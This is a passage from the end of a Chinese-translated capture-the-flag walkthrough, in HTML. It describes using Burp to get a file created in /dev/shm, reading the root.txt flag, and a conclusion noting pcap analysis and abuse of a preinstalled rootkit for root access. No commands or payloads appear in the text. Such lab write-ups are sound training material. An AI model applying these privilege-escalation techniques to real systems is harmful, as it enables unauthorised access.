class="gh gi qw"><img src="../Images/8fd1e5506f29e37331bc2d4367133056.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9Uui0sIH9Yq-0D02kD6TNA.png"/></div></div></figure><p id="4982" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">一旦通过<code class="fe kz la lb lc b">Burp</code>运行，我们可以看到来自服务器的有希望的响应。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qx"><img src="../Images/4067f9f76faeb690074d12085fd40e4c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xY-sHOVOcsMtEa67_aOpBg.png"/></div></div></figure><p id="1402" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">事实上，它在<code class="fe kz la lb lc b">/dev/shm</code>文件夹下创建了名为<code class="fe kz la lb lc b">bigb0ss</code>的文件。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qy"><img src="../Images/7b4ed89e476d174c86b8ee7fc50e2311.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0thWAD05ofVU_XG5bHYokw.png"/></div></div></figure><p id="8087" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">而当我们<code class="fe kz la lb lc b">cat</code>这个文件时，我们可以成功地读取<code class="fe kz la lb lc b">root.txt</code>标志。</p></div><div class="ab cl ld le hx lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="im in io ip iq"><h1 id="a79e" class="lp lq it bd lr ls od lu lv lw oe ly lz ma of mc md me og mg mh mi oh mk ml mm bi translated">结论</h1><p id="76ea" class="pw-post-body-paragraph kb kc it kd b ke mn kg kh ki mo kk kl km mp ko kp kq mq ks kt ku mr kw kx ky im bi">_________________________________________________________________</p><p id="8667" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">就像这个盒子的名字一样，为了完全破坏这个盒子，需要寻找很多线索并获得不同级别的访问权限。我真的很喜欢这个盒子，特别是用于<code class="fe kz la lb lc b">pcap</code>文件分析和利用预装的rootkit来获得root访问权限。如果你准备好了这一部分，我真的很感谢你阅读一个长的演练。感谢阅读！:)</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi qz"><img src="../Images/5f9d67c1d5ee72ae69e3e36d4786d73d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*djpFwqNmGPnEHOQN6fxeMg.png"/></div></div></figure></div></div>    
</body>
</html>